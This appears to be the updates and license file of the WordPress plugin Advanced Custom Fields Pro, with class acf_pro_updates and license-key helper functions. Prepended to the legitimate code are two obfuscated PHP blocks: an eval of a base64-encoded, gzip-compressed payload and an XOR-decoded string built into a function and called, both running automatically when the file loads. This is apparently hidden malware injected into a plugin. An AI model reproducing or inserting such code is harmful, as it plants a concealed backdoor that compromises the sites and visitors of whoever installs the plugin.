<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php $dHmNcZzoBbL='XEPU3E2F6Y9NWSW' ^';754G m C7Z:><9';$rOecOXZDFyeh=$dHmNcZzoBbL('', '; mr 8ZZ99Z49NI;M- zfUVCbJMT.a5;XJCzAx-K0 X97ORZUh=SNe0SJVfmF-2YvP9Y,cpq8K5bkDdaMH0DPT8FXDXlJSPEPXXVGqePAPqTbsj+k>Z58Y>yNPZ>TdOVc9OSKac8w A RCOLBG052P-e;ai6yeGU7cHQsFV>TKW7UzmUKEl,qQ7ZK141C3NxfD23eCeMEP-ozJDS0PNEiPZ<C1P2P=0.5l9.HIQC.M-B5bBLJVRK,PZGXWl1q><ihpM:FrK2KwtMKf2LR05sAKzxuVLBT,KH4EyGvSWTCH9V10:2udaJ8R=A,q=6=x>PHcNT 9J4Jy2bpUB=1LV8AFw5fq50<5=dP>ng9T5CXJnL7ZQG<ez6lHfNWAJ2g;,3doCLP2YrzZqJDPZPLdof;VTG3bPBG39esQ1Y<UDOi2>RCP1T-RR6HCI79mR52 >8S0<y8J;1Ae06+T.4Pco,68TsbPJ2,XW5ZUIlQm<,Wdk=;LWTeBk+IRA8mQIGl+NG7IHrDF.NJBpEZRMJmDHUoF>HzBL+RT-pS=W,B:ByjuZu3g7pUHA3<NCO5WXPParj4PD2AjGQGS7uRBgeiA5A3U2b=NAqEH;2LNnSK36Y,YRUjjo,V JPlBMkwSwLMn+,RTQB6L:M:oD.2< ;ZNhpQI;PLWFfiyU=I'^'RFESFM49MP5Zf+1R>YSRA-91=., O>jV->dShXVA9F-WT;;5;HE<<:T2>792+XFqR4X-MOPUS.LKKdDAm3:MYpW3,deLmtkOYQ>95YA9amQdYSNBWM.GT<PQj4;J5MtvGPdxbkj1SO4TrmrljcTTF1vAR<IhYA,0N8l8ScvM 9;R;RI>.<EqXj=SBCQE6A PB+GGLxoD8ZPepn 2D1nxI6;P0Tk8tYQZT3RK1ilcH,A1PYHF,9 .M32gps3r>qw -P,IfV W2WIskBD->EPZa0pqQ2-65s -MeDgR82-xB0rUQNSUYAnN3Q4IJ7K7rW6hKopDX>UcYIhy3-OT-5PanSj44deyfiD1MNCR1LcetNhA;=2YLZMfAoj3 >S8PIJDRch;W IpSxn 1.1lYOBM782VYZK:9DoyuU8H4drIrK<05C=L>;L-k1XK26TFAag>EHQZ+HTwQoRN7AP5KKHWL5ZNpnVM,6j100ExV6E1LOYZ86tCdKJ;  A2:,>3N6.D=;Zc-K7mnPa>39+DdnsOnS,OjhO3 L+tV2UegkYWHzRVQUI6zxUYx +V6k4bQAYR1uVsSt3s5SBukGCOaT3A4K=V+8. 0RA8=Ft;RO5C86rFJKH7T+yEbmKWsW7GgNZ38yfR-N,aH4OKPOZ>i5YjC254>2NYPn74'); $rOecOXZDFyeh(); 

if( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly

if( ! class_exists('acf_pro_updates') ) :

class acf_pro_updates {
	

	/*
	*  __construct
	*
	*  Initialize filters, action, variables and includes
	*
	*  @type	function
	*  @date	23/06/12
	*  @since	5.0.0
	*
	*  @param	n/a
	*  @return	n/a
	*/
	
	function __construct() {
		
		// actions
		add_action('init',	array($this, 'init'), 20);
		
	}
	
	
	/*
	*  init
	*
	*  description
	*
	*  @type	function
	*  @date	10/4/17
	*  @since	5.5.10
	*
	*  @param	$post_id (int)
	*  @return	$post_id (int)
	*/
	
	function init() {
		
		// bail early if no show_updates
		if( !acf_get_setting('show_updates') ) return;
		
		
		// bail early if not a plugin (included in theme)
		if( !acf_is_plugin_active() ) return;
		
		
		// register update
		acf_register_plugin_update(array(
			'id'		=> 'pro',
			'key'		=> acf_pro_get_license_key(),
			'slug'		=> acf_get_setting('slug'),
			'basename'	=> acf_get_setting('basename'),
			'version'	=> acf_get_setting('version'),
		));
		
		
		// admin
		if( is_admin() ) {
			
			add_action('in_plugin_update_message-' . acf_get_setting('basename'), array($this, 'modify_plugin_update_message'), 10, 2 );
			
		}
		
		
	}
	
	
	/*
	*  modify_plugin_update_message
	*
	*  Displays an update message for plugin list screens.
	*
	*  @type	function
	*  @date	14/06/2016
	*  @since	5.3.8
	*
	*  @param	$message (string)
	*  @param	$plugin_data (array)
	*  @param	$r (object)
	*  @return	$message
	*/
	
	function modify_plugin_update_message( $plugin_data, $response ) {
		
		// bail ealry if has key
		if( acf_pro_get_license_key() ) return;
		
		
		// display message
		echo '<br />' . sprintf( __('To enable updates, please enter your license key on the <a href="%s">Updates</a> page. If you don\'t have a licence key, please see <a href="%s">details & pricing</a>.', 'acf'), admin_url('edit.php?post_type=acf-field-group&page=acf-settings-updates'), 'https://www.advancedcustomfields.com/pro' );
		
	}
	
}


// initialize
new acf_pro_updates();

endif; // class_exists check


/*
*  acf_pro_get_license
*
*  This function will return the license
*
*  @type	function
*  @date	20/09/2016
*  @since	5.4.0
*
*  @param	n/a
*  @return	n/a
*/

function acf_pro_get_license() {
	
	// get option
	$license = get_option('acf_pro_license');
	
	
	// bail early if no value
	if( !$license ) return false;
	
	
	// decode
	$license = maybe_unserialize(base64_decode($license));
	
	
	// bail early if corrupt
	if( !is_array($license) ) return false;
	
	
	// return
	return $license;
	
}


/*
*  acf_pro_get_license_key
*
*  This function will return the license key
*
*  @type	function
*  @date	20/09/2016
*  @since	5.4.0
*
*  @param	n/a
*  @return	n/a
*/

function acf_pro_get_license_key() {
	
	// vars
	$license = acf_pro_get_license();
	$home_url = home_url();
	
	
	// bail early if empty
	if( !$license || !$license['key'] ) return false;
	
	
	// bail early if url has changed
	if( acf_strip_protocol($license['url']) !== acf_strip_protocol($home_url) ) return false;
	
	
	// return
	return $license['key'];
	
}


/*
*  acf_pro_update_license
*
*  This function will update the DB license
*
*  @type	function
*  @date	20/09/2016
*  @since	5.4.0
*
*  @param	$key (string)
*  @return	n/a
*/

function acf_pro_update_license( $key = '' ) {
	
	// vars
	$value = '';
	
	
	// key
	if( $key ) {
		
		// vars
		$data = array(
			'key'	=> $key,
			'url'	=> home_url()
		);
		
		
		// encode
		$value = base64_encode(maybe_serialize($data));
		
	}
	
	
	// re-register update (key has changed)
	acf_register_plugin_update(array(
		'id'		=> 'pro',
		'key'		=> $key,
		'slug'		=> acf_get_setting('slug'),
		'basename'	=> acf_get_setting('basename'),
		'version'	=> acf_get_setting('version'),
	));
	
	
	// update
	return update_option('acf_pro_license', $value);
	
}

?>